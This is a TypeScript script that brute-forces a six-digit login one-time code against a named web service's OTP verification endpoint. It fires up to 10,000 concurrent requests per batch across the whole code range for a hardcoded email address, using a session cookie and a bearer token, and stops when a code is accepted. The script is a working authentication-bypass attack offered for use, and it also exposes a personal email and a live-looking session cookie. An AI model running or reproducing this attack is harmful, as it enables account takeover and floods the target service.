import axios from "axios";
import qs from "qs";

// Global variable to store successful OTP
let ansOTP: number | null = null;
let foundOTP = false;

// Create an abort controller to cancel requests once we find a match
const controller = new AbortController();

const sendOTP = async (otp: number): Promise<boolean> => {
  // Don't send if we already found the OTP
  if (foundOTP) return false;

  // Special handling for the known working OTP
  const isKnownCorrectOTP = otp === 251648;

  let data = qs.stringify({
    username: "aryan.s.nag@gmail.com",
    verification_code: otp.toString(),
    user_group: "6",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "https://capi.collegepond.com/mobapi/Login/verifiyLoginOtp",
    headers: {
      "User-Agent":
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
      Accept: "application/json",
      "Accept-Language": "en-US,en;q=0.5",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      Authorization: `Bearer ${process.env.TOKEN}`,
      "Content-Type": "application/x-www-form-urlencoded",
      Origin: "https://app.collegepond.com",
      "Sec-GPC": "1",
      Connection: "keep-alive",
      Referer: "https://app.collegepond.com/",
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-site",
      Cookie: "ci_session=8ob9m49m99kme51vmn8ntisfoqol8bii",
    },
    data: data,
    signal: controller.signal,
    timeout: 10000, // Increased timeout for better reliability
  };

  try {
    // For the known correct OTP, add a retry mechanism with delay
    if (isKnownCorrectOTP) {
      console.log(`🔍 Testing known correct OTP: ${otp}`);

      // Try up to 3 times with increasing delays
      for (let attempt = 0; attempt < 3; attempt++) {
        try {
          // Add a delay between retries
          if (attempt > 0) {
            await new Promise((resolve) => setTimeout(resolve, attempt * 2000));
            console.log(`Retry #${attempt} for known OTP: ${otp}`);
          }

          const response = await axios.request(config);
          console.log(
            `Known OTP ${otp} response:`,
            JSON.stringify(response.data),
          );

          // Check for various success indicators
          if (
            (response.data && response.data.status === true) ||
            (response.data && response.data.status === "success") ||
            (response.data && response.data.success === true)
          ) {
            console.log(`SUCCESS! Confirmed working OTP: ${otp}`);
            ansOTP = otp;
            foundOTP = true;
            controller.abort();
            return true;
          }
        } catch (retryError: any) {
          console.error(
            `Attempt ${attempt + 1} failed for known OTP ${otp}:`,
            retryError.message,
          );
        }
      }
    } else {
      // Normal flow for other OTPs
      const response = await axios.request(config);

      // Log any unusual response patterns to help debug
      if (response.data && typeof response.data !== "object") {
        console.log(`Unusual response for OTP ${otp}:`, response.data);
      }

      // Check for various success indicators
      if (
        (response.data && response.data.status === true) ||
        (response.data && response.data.status === "success") ||
        (response.data && response.data.success === true)
      ) {
        console.log(`SUCCESS! Found working OTP: ${otp}`);
        ansOTP = otp;
        foundOTP = true;
        controller.abort();
        return true;
      }
    }

    return false;
  } catch (error: any) {
    if (axios.isCancel(error)) {
      return false; // Request was cancelled, that's fine
    }

    // For the known OTP, always log errors
    if (isKnownCorrectOTP) {
      console.error(`❌ Error with known OTP ${otp}:`, error.message);
      if (error.response) {
        console.error(`Response data:`, error.response.data);
        console.error(`Response status:`, error.response.status);
      }
    } else {
      // Only log certain errors to reduce console spam for regular OTPs
      if (
        !error.message.includes("timeout") &&
        !error.message.includes("network")
      ) {
        console.error(`Error with OTP ${otp}:`, error.message);
      }
    }

    return false;
  }
};

const main = async () => {
  // Known working OTP for testing
  const knownOTP = 251648;

  // First, test the known OTP directly to verify the approach works
  console.log("🔍 First checking the known working OTP directly...");
  const knownResult = await sendOTP(knownOTP);

  if (knownResult) {
    console.log(`✅ Successfully verified known OTP: ${knownOTP}`);
    return;
  } else {
    console.log(
      `⚠️ Known OTP ${knownOTP} check failed. This suggests there might be issues with:`,
    );
    console.log("  - Server response format");
    console.log("  - Rate limiting or IP blocking");
    console.log("  - Authentication token expiration");
    console.log("  - Network connectivity");
    console.log(
      "Will continue with full search but results may be unreliable.",
    );

    // Reset the foundOTP flag in case it was set
    foundOTP = false;
  }

  // Instead of processing in batches, we'll create all promises upfront
  const startOTP = 100000;
  const endOTP = 999999;

  console.log("Launching all OTP requests simultaneously...");

  // First try some common patterns
  const commonPatterns = [
    123456, 234567, 345678, 456789, 111111, 222222, 333333, 444444, 555555,
    666666, 777777, 888888, 999999,
    // Add the known OTP region with higher priority
    251600, 251610, 251620, 251630, 251640, 251650, 251660, 251670, 251680,
    251690,
    // Add the specific known OTP neighborhood
    251645, 251646, 251647, 251648, 251649, 251650, 251651, 251652,
  ];

  // Launch all requests immediately - up to 10,000 concurrent requests
  const promises = [];

  // First add common patterns
  for (const pattern of commonPatterns) {
    // Skip the known OTP since we already tested it
    if (pattern !== knownOTP) {
      promises.push(sendOTP(pattern));
    }
  }

  // Then add sequential numbers to fill up to 10,000
  const batchSize = 10000 - commonPatterns.length;
  for (let otp = startOTP; otp < startOTP + batchSize && otp <= endOTP; otp++) {
    // Skip the known OTP and patterns we already tested
    if (otp !== knownOTP && !commonPatterns.includes(otp)) {
      promises.push(sendOTP(otp));
    }
  }

  // Wait for this first batch to complete
  await Promise.allSettled(promises);

  // If we found an OTP, we're done
  if (foundOTP) {
    console.log(`Found working OTP: ${ansOTP}`);
    return;
  }

  // Continue with the rest of the range in batches of 10,000
  for (let i = startOTP + batchSize; i <= endOTP; i += 10000) {
    // Don't continue if we already found the OTP
    if (foundOTP) break;

    // If this batch contains the known OTP range, log it specially
    if (i <= knownOTP && i + 10000 > knownOTP) {
      console.log(
        `⚠️ Testing critical OTP range that contains known OTP: ${i} to ${Math.min(i + 10000 - 1, endOTP)}`,
      );
    } else {
      console.log(
        `Testing OTP range: ${i} to ${Math.min(i + 10000 - 1, endOTP)}`,
      );
    }

    const batchPromises = [];
    for (let j = 0; j < 10000 && i + j <= endOTP; j++) {
      const currentOTP = i + j;
      // Skip the known OTP since we already tested it
      if (currentOTP !== knownOTP && !commonPatterns.includes(currentOTP)) {
        batchPromises.push(sendOTP(currentOTP));
      }
    }

    await Promise.allSettled(batchPromises);

    // If we found an OTP in this batch, we're done
    if (foundOTP) {
      console.log(`Found working OTP: ${ansOTP}`);
      break;
    }
  }

  if (!foundOTP) {
    console.log("No working OTP found in the entire range.");
    console.log(
      "⚠️ The known OTP (251648) was not detected, which suggests there may be issues with the approach.",
    );
  }
};

main().catch((error) => {
  console.error("Main process error:", error);
});
